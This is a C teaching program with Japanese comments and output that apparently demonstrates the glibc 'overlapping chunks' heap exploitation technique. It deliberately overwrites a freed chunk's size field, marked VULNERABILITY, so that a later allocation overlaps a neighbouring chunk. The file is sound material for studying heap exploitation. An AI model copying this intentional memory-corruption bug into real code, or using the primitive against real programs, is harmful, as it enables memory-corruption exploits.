/*

 overlapping chunk(重なり合うチャンク)の簡単な物語です。
 この技法は次の資料から取っています。
 http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <assert.h>

int main(int argc , char* argv[])
{
	setbuf(stdout, NULL);

	long *p1,*p2,*p3,*p4;
	printf("\nこれはもう一つの単純な chunk overlapping(チャンクの重なり)の問題です\n");
	printf("以前の技法は次のパッチで潰されました: https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c\n"
		   "このパッチは、unsortedbin のチャンクの次のチャンクで prev_inuse ビットが立っていないこと、\n"
		   "かつその prev_size が unsortedbin のチャンクのサイズと一致することを保証します\n"
		   "この新しい poc は以前のものと同じプリミティブ(primitive)を使います。理論上、両者の強力さは同じです。\n\n");

	printf("まず、ヒープ上に 4 つのチャンクを確保してみましょう\n");

	p1 = malloc(0x80 - 8);
	p2 = malloc(0x500 - 8);
	p3 = malloc(0x80 - 8);

	printf("3 つのチャンクがここに確保されました:\np1=%p\np2=%p\np3=%p\n", p1, p2, p3);

	memset(p1, '1', 0x80 - 8);
	memset(p2, '2', 0x500 - 8);
	memset(p3, '3', 0x80 - 8);

	printf("ここで、解放される p2 のチャンクのサイズを上書きできる\nオーバーフローを模擬してみましょう。\n");
	int evil_chunk_size = 0x581;
	int evil_region_size = 0x580 - 8;
	printf("チャンク p2 のサイズを %d に設定します。これにより\nリージョンサイズは %d になります\n",
		 evil_chunk_size, evil_region_size);

	/* VULNERABILITY */
	*(p2-1) = evil_chunk_size; // チャンク p2 の "size" フィールドを上書きしています
	/* VULNERABILITY */

	printf("\n次に、チャンク p2 を解放してみましょう\n");
	free(p2);
	printf("チャンク p2 は unsorted bin に入り、同じサイズの新しい malloc() が\n来たときに応じられる状態になりました\n");

	printf("\n次に、チャンク p2 に注入したサイズのデータ領域サイズと\n"
	       "等しいサイズで、別のチャンクを確保してみましょう\n");
	printf("この malloc は、先ほど解放されて unsorted bin に置かれている、\n"
	       "私たちがサイズを書き換えたチャンクから返されます\n");
	p4 = malloc(evil_region_size);

	printf("\np4 は %p に確保され、%p で終わります\n", (char *)p4, (char *)p4+evil_region_size);
	printf("p3 は %p から始まり、%p で終わります\n", (char *)p3, (char *)p3+0x80-8);
	printf("p4 は p3 と重なるはずです。この場合、p4 は p3 をすべて含みます。\n");

	printf("\nこれで、チャンク p4 の中にコピーしたものはすべてチャンク p3 の\nデータを上書きできます。"
		   "また、チャンク p3 に書き込んだデータは、\np4 のチャンクに格納されたデータを上書きできます。\n\n");

	printf("例を順に見ていきましょう。現時点では次のようになっています:\n");
	printf("p4 = %s\n", (char *)p4);
	printf("p3 = %s\n", (char *)p3);

	printf("\nmemset(p4, '4', %d) を実行すると、次のようになります:\n", evil_region_size);
	memset(p4, '4', evil_region_size);
	printf("p4 = %s\n", (char *)p4);
	printf("p3 = %s\n", (char *)p3);

	printf("\nさらにその後 memset(p3, '3', 80) を実行すると、次のようになります:\n");
	memset(p3, '3', 80);
	printf("p4 = %s\n", (char *)p4);
	printf("p3 = %s\n", (char *)p3);

	assert(strstr((char *)p4, (char *)p3));
}


